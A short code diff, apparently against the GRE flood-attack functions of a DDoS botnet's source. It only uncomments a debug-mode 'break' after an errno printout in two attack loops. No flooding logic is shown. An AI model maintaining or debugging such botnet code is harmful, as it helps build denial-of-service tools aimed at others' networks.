@@ -154,7 +154,7 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
 #ifdef DEBUG
         if (errno != 0)
             printf("errno = %d\n", errno);
-//        break;
+        break;
 #endif
     }
 }
@@ -312,7 +312,7 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 #ifdef DEBUG
         if (errno != 0)
             printf("errno = %d\n", errno);
-//        break;
+        break;
 #endif
     }
 }
